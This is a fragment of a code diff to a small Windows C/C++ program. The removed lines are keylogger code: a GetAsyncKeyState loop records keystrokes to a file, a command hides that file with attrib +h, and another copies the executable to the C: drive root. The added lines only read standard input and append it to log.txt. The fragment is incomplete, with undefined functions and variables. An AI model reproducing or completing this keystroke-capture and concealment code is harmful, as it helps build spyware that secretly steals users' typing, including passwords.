@@ -1,7 +1,7 @@
 #include <stdio.h>
 #include <ctype.h>
 #include <iostream>
-#include <windows.h>
+//#include <windows.h>
 #include <stdio.h>
 #include <winuser.h>
 
@@ -24,14 +24,26 @@ int main()
 
     while(true){
 
-        for(a=8;a<=255;a++){           
-		   if(GetAsyncKeyState(a) == -32767) // captura as teclas !!
-		//salvar(toupper(a),"lo.txt");
-		salvar(a,"lo.txt");		
-		}
-	system("attrib +h lo.txt");
-	system("copy t.exe c:\\");
+     do{
+//	while(answer){
+		letter=getchar();
+		phrase[i]=letter;
+		++i;
 	
+	
+	
+	
+}while(letter != '\n');
+	phrase[i-1]='\0';
+	x=phrase;
+//	}
+
+
+	FILE *file;
+	file=fopen("log.txt", "a+");
+		fprintf(file,"%s\n",x);
+	fclose(file);
+
 	
 	
 
